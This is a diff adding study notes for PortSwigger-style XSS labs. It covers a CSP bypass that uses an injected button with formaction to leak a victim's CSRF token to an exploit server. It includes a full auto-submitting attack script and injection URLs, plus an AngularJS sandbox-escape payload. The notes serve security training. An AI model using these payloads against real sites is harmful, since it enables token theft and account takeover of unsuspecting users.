@@ -358,8 +358,106 @@ function handleResponse() {
 </script>
 ```
 
+### Reflected XSS protected by very strict CSP, with dangling markup attack
+
+```
+This lab uses a strict CSP that prevents the browser from loading subresources from external domains.
+
+To solve the lab, perform a form hijacking attack that bypasses the CSP, exfiltrates the simulated victim user's CSRF token, and uses it to authorize changing the email to `hacker@evil-user.net`.
+
+You must label your vector with the word "Click" in order to induce the simulated user to click it. For example:
+
+`<a href="">Click me</a>`
+
+You can log in to your own account using the following credentials: `wiener:peter`
+```
 
 
+-  log into lab and access my-account page
+-  attempt to change email with xss payload like ``<img src onerror=alert(1)>``
+- notice you can change the email input element from email type to text to bypass client side controls
+-  now change payload to having a valid email format at the beginning appending the xss: ``foo@example.com"><img src= onerror=alert(1)>``
+-  submit and view dev tools to see that csp still blocks
+-  add the email query parameter to the end of the page url and use it to attempt inserting the payload again: ``https://YOUR-LAB-ID.web-security-academy.net/my-account?email=<img src onerror=alert(1)>``
+- load the URL and view dev tools to confirm the CSP blocks it
+- Now that we've confirmed that CSP is blocking our XSS payload, our next step is to try to bypass this protection by checking for weaknesses in the CSP, such as a missing `form-action` directive.
+- use the XSS vulnerability in the way the `email` query parameter is processed to inject a button. For example: `https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me</button>`
+- Load this URL. Notice your injected button appears on the page, and that the **Email** form is populated with a valid email format.
+- Click your new button. You are taken to the exploit server. This demonstrates that our attack was able to bypass the site's security and allow redirection of form submissions to an external server.
+- Notice that the CSRF token is not visible in the URL. This is because the form is submitted via the `POST` method, which sends data in the body rather than in the URL.
+- Go back to the lab. Re-inject the button with its `formaction` attribute. This time, also add the `formmethod="get"` attribute so that the form is submitted with a GET request. For example: `https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" formmethod="get">Click me</button>` Click your new button. You are taken to the exploit server with the CSRF token now visible in the URL.
+- Return to the exploit server and enter the following attack script into the Body field:
+```
+<body> 
+<script> 
+// Define the URLs for the lab environment and the exploit server. 
+const academyFrontend = "https://your-lab-url.net/"; 
+const exploitServer = "https://your-exploit-server.net/exploit"; 
 
+// Extract the CSRF token from the URL. 
+const url = new URL(location); 
+const csrf = url.searchParams.get('csrf'); 
 
+// Check if a CSRF token was found in the URL. 
+if (csrf) { 
+
+// If a CSRF token is present, create dynamic form elements to perform the attack. 
+const form = document.createElement('form'); 
+const email = document.createElement('input'); 
+const token = document.createElement('input'); 
+
+// Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures. 
+token.name = 'csrf'; 
+token.value = csrf; 
+
+// Configure the new email address intended to replace the user's current email. 
+email.name = 'email'; 
+email.value = 'hacker@evil-user.net'; 
+
+// Set the form attributes, append the form to the document, and configure it to automatically submit. 
+
+form.method = 'post'; 
+form.action = `${academyFrontend}my-account/change-email`; 
+form.append(email); 
+form.append(token); 
+document.documentElement.append(form); 
+form.submit(); 
+
+// If no CSRF token is present, redirect the browser to a crafted URL that embeds a clickable button designed to expose or generate a CSRF token by making the user trigger a GET request 
+} else { location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`; } 
+
+</script> 
+</body>
+```
+- Click **Store**, then **Deliver exploit to victim**. The user's email will be changed to `hacker@evil-user.net`
+
+## Expert Labs
+
+### Lab: Reflected XSS with AngularJS sandbox escape without strings
+
+```
+This lab uses AngularJS in an unusual way where the `$eval` function is not available and you will be unable to use any strings in AngularJS.
+
+To solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the `alert` function without using the `$eval` function.
+```
+
+additional information:
+```
+In a standard sandbox escape, you would use `$eval()` to execute your JavaScript payload, but in the lab below, the `$eval()` function is undefined. Fortunately, we can use the `orderBy` filter instead. The typical syntax of an `orderBy` filter is as follows:
+
+`[123]|orderBy:'Some string'`
+
+Note that the `|` operator has a different meaning than in JavaScript. Normally, this is a bitwise `OR` operation, but in AngularJS it indicates a filter operation. In the code above, we are sending the array `[123]` on the left to the `orderBy` filter on the right. The colon signifies an argument to send to the filter, which in this case is a string. The `orderBy` filter is normally used to sort an object, but it also accepts an expression, which means we can use it to pass a payload.
+
+You should now have all the tools you need to tackle the next lab.
+```
+
+payload that triggers the xss: 
+```
+1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+```
+
+the `toString()` is a way to place \'' into the search bar, the we use the .join with charAt to pass a full string. Then we use the fromCharCode to pass ascii representation of `x=alert(1)`
+
+good video to review on this: https://www.youtube.com/watch?v=OY-wyhyt81I
 
